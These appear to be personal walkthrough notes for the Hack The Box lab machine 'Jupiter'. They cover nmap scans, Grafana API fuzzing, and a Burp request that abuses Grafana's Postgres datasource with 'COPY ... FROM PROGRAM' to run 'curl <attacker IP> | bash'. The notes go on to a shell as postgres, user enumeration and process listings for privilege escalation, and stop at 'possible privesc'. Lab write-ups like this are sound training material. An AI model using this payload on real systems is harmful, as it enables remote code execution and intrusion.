# Jupiter HTB

## NMAP scanning
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63



PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

## virtual hosting
http://kiosk.jupiter.htb => Grafana


SQLI, NOSQL => doesn't work


## Fuzzing

http://kiosk.jupiter.htb/api/org

```json
{
    "id": 1,
    "name": "Jupiter",
    "address": {
        "address1": "",
        "address2": "",
        "city": "",
        "zipCode": "",
        "state": "",
        "country": ""
    }
}
```

http://kiosk.jupiter.htb/api/search

```json
[
    {
        "id": 1,
        "uid": "jMgFGfA4z",
        "title": "Moons",
        "uri": "db/moons",
        "url": "/d/jMgFGfA4z/moons",
        "slug": "",
        "type": "dash-db",
        "tags": [],
        "isStarred": false,
        "sortMeta": 0
    }
]
```


http://kiosk.jupiter.htb/api/login/ping


```json
{
"message": "Logged in"
}
```



trying to get grafana login


"""
If you're seeing this Grafana has failed to load its application files


1. This could be caused by your reverse proxy settings.

2. If you host grafana under subpath make sure your grafana.ini root_url setting includes subpath. If not using a reverse proxy make sure to set serve_from_sub_path to true.

3. If you have a local dev build make sure you build frontend using: yarn start, or yarn build

4. Sometimes restarting grafana-server can help

5. Check if you are using a non-supported browser. For more information, refer to the list of supported browsers.
"""



```bash
postgres@jupiter:/$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
juno:x:1000:1000:juno:/home/juno:/bin/bash
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
jovian:x:1001:1002:,,,:/home/jovian:/bin/bash
```



```burpsuite

POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 24
x-plugin-id: postgres
Content-Length: 401
Origin: http://kiosk.jupiter.htb
Connection: close

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"COPY cmd_exec FROM PROGRAM 'curl http://10.10.14.29 | bash';SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":662}],"range":{"from":"2023-06-07T13:54:29.170Z","to":"2023-06-07T19:54:29.170Z","raw":{"from":"now-6h","to":"now"}},"from":"1686146069170","to":"1686167669170"}
```

rce





postgres@jupiter:/$ ps -faux | grep "juno"
juno       29680  0.0  0.0   2888   988 ?        Ss   Jun06   0:00      \_ /bin/sh -c /home/juno/shadow-simulation.sh
juno       29681  0.0  0.0   7368  3548 ?        S    Jun06   0:00          \_ /bin/bash /home/juno/shadow-simulation.sh
juno       29683  0.0  4.0 573204 161604 ?       Sl   Jun06   0:00              \_ /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
juno       29692  0.0  0.0      0     0 ?        Z    Jun06   0:00                  \_ [sh] <defunct>
postgres   53364  0.0  0.0   6476  2456 pts/0    S+   20:43   0:00                                  \_ grep juno
juno       30086  0.0  0.2  18032 10004 ?        S    Jun06   0:00 vi Untitled.ipynb
juno       30182  0.0  0.0   4360  3248 ?        S    Jun06   0:00 bash


possible privesc

/home/juno/.local/bin:/home/juno/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
